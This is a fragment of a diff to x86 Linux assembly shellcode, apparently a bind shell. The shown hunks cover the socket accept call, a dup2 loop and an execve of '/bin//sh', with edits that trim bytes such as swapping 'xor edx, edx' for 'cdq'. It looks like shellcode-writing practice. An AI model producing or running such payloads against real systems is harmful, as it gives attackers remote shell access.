@@ -15,7 +15,7 @@ _start:
   mov ecx, esp    ; pointer to args into ecx
   int 0x80        ; call the func
   xchg esi, eax   ; sockfd from eax into esi
- 
+
   ; bind
   ; arguments
   xor eax, eax
@@ -56,8 +56,7 @@ _start:
   push ebx        ; push NULL
   push ebx        ; push NULL
   push esi        ; push sockfd
-  mul ebx
-  mov bl,0x5      ; #define SYS_ACCEPT 5 
+  mov bl,0x5      ; #define SYS_ACCEPT 5
   mov al, 0x66  ; socketcall
   mov ecx, esp    ; pointer to args into ecx
   int 0x80
@@ -73,7 +72,7 @@ duploop:
   jns duploop     ; as long as SF is not set, keep looping
 
   ; execve
-  xor edx, edx
+  cdq             ; xor edx, edx but saves us a byte
   push edx        ; NULL string terminator
   push 0x68732f2f ; hs//
   push 0x6e69622f ; nib/
